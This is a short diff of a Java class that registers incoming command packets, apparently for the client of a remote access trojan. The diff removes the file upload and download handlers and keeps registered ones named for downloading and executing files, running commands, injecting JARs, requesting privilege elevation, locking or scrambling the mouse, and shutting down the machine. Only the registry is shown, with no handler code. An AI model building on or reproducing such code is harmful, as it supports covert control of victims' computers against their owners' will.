@@ -18,7 +18,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 14, Packet14VisitURL.class);
         PACKETS_INCOMING.put((short) 17, Packet17DownloadExecute.class);
         PACKETS_INCOMING.put((short) 18, Packet18Update.class);
-        PACKETS_INCOMING.put((short) 21, Packet21ClientUploadFile.class);
         PACKETS_INCOMING.put((short) 27, Packet27ToggleMouseLock.class);
         PACKETS_INCOMING.put((short) 28, Packet28ShutdownComputer.class);
         PACKETS_INCOMING.put((short) 29, Packet29RestartComputer.class);
@@ -30,7 +29,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 38, Packet38RunCommand.class);
         PACKETS_INCOMING.put((short) 39, Packet39VisitManyURLs.class);
         PACKETS_INCOMING.put((short) 40, Packet40Thumbnail.class);
-        PACKETS_INCOMING.put((short) 42, Packet42ClientDownloadFile.class);
         PACKETS_INCOMING.put((short) 43, Packet43CreateDirectory.class);
         PACKETS_INCOMING.put((short) 44, Packet44PlaySoundFromURL.class);
         PACKETS_INCOMING.put((short) 46, Packet46CrazyMouse.class);
@@ -62,8 +60,6 @@ public class IncomingPackets {
         PACKETS_INCOMING.put((short) 96, Packet96EnvironmentVariables.class);
         PACKETS_INCOMING.put((short) 98, Packet98InjectJAR.class);
         PACKETS_INCOMING.put((short) 100, Packet100RequestElevation.class);
-        PACKETS_INCOMING.put((short) 103, Packet103CompleteClientDownload.class);
-        PACKETS_INCOMING.put((short) 104, Packet104ClientDownloadPart.class);
         PACKETS_INCOMING.put((short) 106, Packet106ClientDownloadPlugin.class);
     }
 
